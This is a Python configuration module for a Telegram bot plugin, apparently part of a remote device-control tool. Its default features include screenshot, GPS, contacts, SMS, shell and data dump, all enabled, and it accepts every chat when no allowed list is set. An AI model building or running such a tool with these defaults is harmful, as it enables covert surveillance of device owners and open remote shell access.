"""Config loading and validation for Telegram Bot plugin."""
from __future__ import annotations
import json
import logging
from pathlib import Path
from typing import Any, Optional

logger = logging.getLogger("telegram_config")

PLUGIN_DIR = Path(__file__).parent
CONFIG_FILE = PLUGIN_DIR / "config.json"

DEFAULT_CONFIG: dict[str, Any] = {
    "bot_token": "YOUR_BOT_TOKEN_HERE",
    "allowed_chats": [],
    "features": {
        "screenshot": True,
        "gps": True,
        "contacts": True,
        "sms": True,
        "shell": True,
        "dump": True,
    },
    "rate_limit": {
        "max_requests_per_minute": 30,
    },
}


class PluginConfig:
    """Plugin configuration manager."""

    def __init__(self, config_path: Optional[Path] = None) -> None:
        self._path = config_path or CONFIG_FILE
        self._config: dict[str, Any] = {}
        self.load()

    def load(self) -> None:
        self._config = DEFAULT_CONFIG.copy()
        if self._path.exists():
            try:
                with open(self._path) as f:
                    user_config = json.load(f)
                self._config.update(user_config)
                logger.info("Config loaded from %s", self._path)
            except Exception as e:
                logger.warning("Config load failed: %s, using defaults", e)
        else:
            logger.warning("Config not found: %s, using defaults", self._path)
            self.save()

    def save(self) -> None:
        with open(self._path, "w", encoding="utf-8") as f:
            json.dump(self._config, f, indent=2, ensure_ascii=False)

    @property
    def bot_token(self) -> str:
        return self._config.get("bot_token", "")

    @property
    def allowed_chats(self) -> list[int]:
        return self._config.get("allowed_chats", [])

    @property
    def features(self) -> dict[str, bool]:
        return self._config.get("features", {})

    @property
    def rate_limit(self) -> dict[str, int]:
        return self._config.get("rate_limit", {})

    def is_chat_allowed(self, chat_id: int) -> bool:
        allowed = self.allowed_chats
        return len(allowed) == 0 or chat_id in allowed

    def is_feature_enabled(self, feature: str) -> bool:
        return self.features.get(feature, True)
